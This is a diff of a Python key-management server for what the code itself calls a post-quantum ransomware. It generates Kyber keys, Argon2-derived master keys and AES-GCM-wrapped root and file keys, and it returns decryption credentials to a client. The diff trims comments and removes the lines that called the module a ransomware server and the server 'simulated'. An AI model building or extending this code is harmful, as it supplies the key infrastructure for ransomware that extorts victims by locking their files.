@@ -1,5 +1,4 @@
 """
-Module serveur pour le ransomware post-quantique
 Gère la génération des clés, le stockage et la communication avec le client
 """
 
@@ -12,11 +11,11 @@ import wordlist
 
 class RansomwareServer:
     """
-    Serveur simulé pour la gestion des clés du ransomware
+    Serveur pour gestion des clés
     """
 
     def __init__(self):
-        """Initialise le serveur avec un état vide"""
+        """Initialise serveur"""
         self.root_key: Optional[bytes] = None
         self.wrapped_rk: Optional[bytes] = None
         self.password: Optional[str] = None
@@ -28,26 +27,21 @@ class RansomwareServer:
 
     def initialize_server(self) -> Dict:
         """
-        Initialise le serveur et génère toutes les clés nécessaires
+        Initialise serveur et génère clés
 
         Returns:
-            Dictionnaire contenant:
-            - password: Mot de passe généré
-            - salt: Salt pour Argon2
-            - argon2_params: Paramètres Argon2
-            - kyber_public_key: Clé publique Kyber
+            Dictionnaire avec password, salt, argon2_params et kyber_public_key
         """
-        print("[SERVEUR] Initialisation du serveur...")
+        print("[SVR] Initialisation du serveur")
 
-        # Génère la paire de clés Kyber
-        print("[SERVEUR] Génération de la paire de clés Kyber...")
+        # Génère paire clés Kyber
         self.kyber_public_key, self.kyber_secret_key = crypto_utils.generate_kyber_keypair()
 
-        # Génère le mot de passe aléatoire
+        # Génère mdp aléatoire
         self.password = wordlist.generate_random_password()
-        print(f"[SERVEUR] Mot de passe généré: {self.password}")
+        print(f"[SVR] Mot de passe généré : {self.password}")
 
-        # Génère le salt pour Argon2
+        # Génère sel
         self.salt = crypto_utils.generate_random_salt()
 
         # Paramètres Argon2
@@ -59,9 +53,8 @@ class RansomwareServer:
         }
 
         self.initialized = True
-        print("[SERVEUR] Initialisation terminée.")
 
-        # Retourne les informations au client
+        # Retourne infos au client
         return {
             "password": self.password,
             "salt": self.salt,
@@ -71,18 +64,15 @@ class RansomwareServer:
 
     def request_full_decryption_credentials(self) -> Dict:
         """
-        Retourne les credentials pour le déchiffrement complet
+        Retourne credentials pour déchiffrement complet
 
         Returns:
-            Dictionnaire contenant:
-            - password: Mot de passe
-            - salt: Salt pour Argon2
-            - argon2_params: Paramètres Argon2
+            Dictionnaire avec password, salt, argon2_params
         """
         if not self.initialized:
-            raise RuntimeError("Le serveur n'est pas initialisé")
+            raise RuntimeError("[ERR] Le serveur n'est pas initialisé")
 
-        print("[SERVEUR] Envoi des credentials de déchiffrement au client...")
+        print("[SVR] Envoi credentials de déchiffrement au client")
 
         return {
             "password": self.password,
@@ -92,61 +82,56 @@ class RansomwareServer:
 
     def request_file_key_unwrap(self, wrapped_key_ciphertext: bytes, wrapped_key_nonce: bytes, wrapped_key_tag: bytes, kyber_ciphertext: bytes) -> bytes:
         """
-        Désencapsule une clé de fichier avec la Root Key
+        Désencapsule clé de fichier avec RK
 
         Args:
-            wrapped_key_ciphertext: Ciphertext de la clé de fichier encapsulée
+            wrapped_key_ciphertext: Ciphertext clé de fichier encapsulée
             wrapped_key_nonce: Nonce utilisé pour l'encapsulation
-            wrapped_key_tag: Tag d'authentification
-            kyber_ciphertext: Ciphertext Kyber pour récupérer la Root Key
+            wrapped_key_tag: Tag
+            kyber_ciphertext: Ciphertext Kyber pour récupérer RK
 
         Returns:
             Clé de fichier désencapsulée
         """
         if not self.initialized:
-            raise RuntimeError("Le serveur n'est pas initialisé")
+            raise RuntimeError("[ERR] Le serveur n'est pas initialisé")
 
         if self.kyber_secret_key is None:
-            raise RuntimeError("La clé secrète Kyber n'est pas disponible")
+            raise RuntimeError("[ERR] La clé secrète Kyber n'est pas dispo")
 
-        print("[SERVEUR] Récupération de la Root Key via Kyber...")
         root_key = crypto_utils.kyber_decapsulate(self.kyber_secret_key, kyber_ciphertext)
 
-        print("[SERVEUR] Désencapsulation de la clé de fichier...")
+        print("[SVR] Désencapsule clé de fichier")
         file_key = crypto_utils.unwrap_key_aes_gcm(wrapped_key_ciphertext, root_key, wrapped_key_nonce, wrapped_key_tag)
 
         return file_key
 
     def change_password(self, new_password: str, new_salt: bytes, new_argon2_params: Dict, kyber_ciphertext: bytes) -> Dict:
         """
-        Change le mot de passe et re-encapsule la Root Key
+        Change mdp et re-encapsule RK
 
         Args:
-            new_password: Nouveau mot de passe
-            new_salt: Nouveau salt pour Argon2
-            new_argon2_params: Nouveaux paramètres Argon2
-            kyber_ciphertext: Ciphertext Kyber pour récupérer la Root Key
+            new_password: New mdp
+            new_salt: New sel
+            new_argon2_params: New paramètres
+            kyber_ciphertext: Ciphertext Kyber pour récupérer RK
 
         Returns:
-            Dictionnaire contenant:
-            - wrapped_rk: Nouvelle Root Key encapsulée
-            - salt: Nouveau salt
-            - argon2_params: Nouveaux paramètres Argon2
+            Dictionnaire avec wrapped_rk, salt et argon2_params
         """
         if not self.initialized:
-            raise RuntimeError("Le serveur n'est pas initialisé")
+            raise RuntimeError("[ERR] Le serveur n'est pas initialisé")
 
         if self.kyber_secret_key is None:
-            raise RuntimeError("La clé secrète Kyber n'est pas disponible")
+            raise RuntimeError("[ERR] La clé secrète Kyber n'est pas dispo")
 
-        print("[SERVEUR] Changement du mot de passe...")
+        print("[SVR] Changement du mot de passe")
 
-        # Récupère la Root Key via Kyber
-        print("[SERVEUR] Récupération de la Root Key via Kyber...")
+        # Récupère RK
         root_key = crypto_utils.kyber_decapsulate(self.kyber_secret_key, kyber_ciphertext)
 
         # Dérive la nouvelle Master Key
-        print("[SERVEUR] Dérivation de la nouvelle Master Key...")
+        print("[SVR] Dérivation de la nouvelle MK")
         new_master_key = crypto_utils.derive_key_argon2(
             password=new_password,
             salt=new_salt,
@@ -154,7 +139,7 @@ class RansomwareServer:
         )
 
         # Re-encapsule la RK avec la nouvelle MK
-        print("[SERVEUR] Re-encapsulation de la Root Key...")
+        print("[SVR] Re-encapsule RK")
         wrapped_rk_ciphertext, wrapped_rk_nonce, wrapped_rk_tag = crypto_utils.wrap_key_aes_gcm(root_key, new_master_key)
 
         # Met à jour l'état du serveur
@@ -162,7 +147,7 @@ class RansomwareServer:
         self.salt = new_salt
         self.argon2_params = new_argon2_params
 
-        print("[SERVEUR] Mot de passe changé avec succès.")
+        print("[SVR] Mot de passe changé")
 
         return {
             "wrapped_rk_ciphertext": wrapped_rk_ciphertext,
